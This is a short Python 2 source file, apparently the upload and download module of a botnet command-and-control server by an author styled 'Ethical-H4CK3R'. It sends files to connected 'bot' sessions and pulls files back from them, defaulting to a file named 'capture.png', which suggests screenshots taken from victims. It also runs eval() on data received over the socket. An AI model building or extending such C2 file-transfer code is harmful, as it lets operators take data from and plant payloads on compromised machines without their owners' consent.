# Date: 10/22/2017
# Author: Ethical-H4CK3R
# Description: Upload & Download

import os
import time
import json
import base64

class File(object):
 ''' Upload & Download '''
 
 def getbytes(self, file):
  with open(str(file), 'rb') as f:return base64.b64encode(f.read())

 def getfile(self, bytes, name):
  with open(str(name), 'wb') as f:f.write(base64.b64decode(bytes))

 def upload(self, bot, file):
  try:
   self.wait = True
   time.sleep(1.5)
   session = bot.session
   session.settimeout(3)
   print 'Uploading {} ...'.format(file)
   bytes = self.getbytes(file)
   name = os.path.basename(file)
   data = [len(bytes), name]
   self.sendData(session, self.struct(98, data))    

   if eval(session.recv(1024)) != 200:return
   time.sleep(1.5);session.sendall(bytes)
  except ValueError:print '[-] Error: Upload Failed [Resetting Connection]';self.killBot(bot)
  except:print '[-] Error: Upload Failed' 
  finally:self.wait = False  

 def download(self, bot, name='capture.png', num=99):
  try:
   bytes = ''
   self.wait = True
   time.sleep(1.5)
   session = bot.session
   session.settimeout(10)
   print 'Downloading {} ...'.format(name)
   self.sendData(session, self.struct(num, [name]))
   data = session.recv(1024)
   data = json.loads(data if data[0] == '{' else '{' + data)
   time.sleep(1.5)
    
   session.sendall('200')
   session.settimeout(3)
   while self.alive:
    try:bytes+=session.recv(data['size'])
    except:break
   if bytes:self.getfile(bytes, str(data['name'])) 
  except ValueError:print '[-] Error: Download Failed [Resetting Connection]';self.killBot(bot)
  except:print '[-] Error: Download Failed'
  finally:self.wait = False
